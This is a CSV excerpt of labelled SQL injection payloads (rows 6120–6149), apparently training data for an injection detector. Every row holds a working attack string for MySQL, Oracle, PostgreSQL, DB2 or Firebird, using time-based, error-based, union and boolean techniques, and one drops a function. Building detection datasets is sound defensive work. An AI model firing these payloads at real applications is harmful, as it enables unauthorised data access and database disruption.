row_index,payload_norm,label,sqli_type_hint
6120,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'boud' = 'boud",1,
6121,"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
6122,"-1203"" ) ) or 8571 = 8571--",1,
6123,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",1,
6124,"1%"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""%"" = """,1,
6125,"1' in boolean mode ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) #",1,
6126,"1' ) ) as sojl where 8710 = 8710 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
6127,1 ) order by 1#,1,
6128,"-3349' or elt ( 6610 = 4379,4379 ) and 'poqm' like 'poqm",1,
6129,"1' in boolean mode ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6130,"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
6131,"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
6132,"1' ) where 5317 = 5317 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
6133,1 ) where 2170 = 2170,1,
6134,"-1015"" ) ) union all select 6624,6624#",1,
6135,"1"" ) ) ) rlike ( select ( case when ( 6915 = 4531 ) then 1 else 0x28 end ) ) and ( ( ( ""jzzu"" = ""jzzu",1,
6136,"-9505' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'qhdg' = 'qhdg",1,
6137,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",1,
6138,if ( 6554 = 1534 ) select 6554 else drop function buqb--,1,
6139,"1"" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""pdsy"" like ""pdsy",1,
6140,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",1,
6141,"1' ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'esma' like 'esma",1,
6142,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) -- bqxe",1,
6143,"-4327"" or make_set ( 3107 = 1781,1781 ) and ""lclf"" like ""lclf",1,
6144,1' ) where 8575 = 8575 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
6145,"1"" ) where 4112 = 4112",1,
6146,"-1487"" ) as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",1,
6147,"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",1,
6148,"1"" ) ) union all select null,null,null,null,null,null,null,null--",1,
6149,1' ) ) as dqdv where 8126 = 8126 and 4595 = 4595#,1,
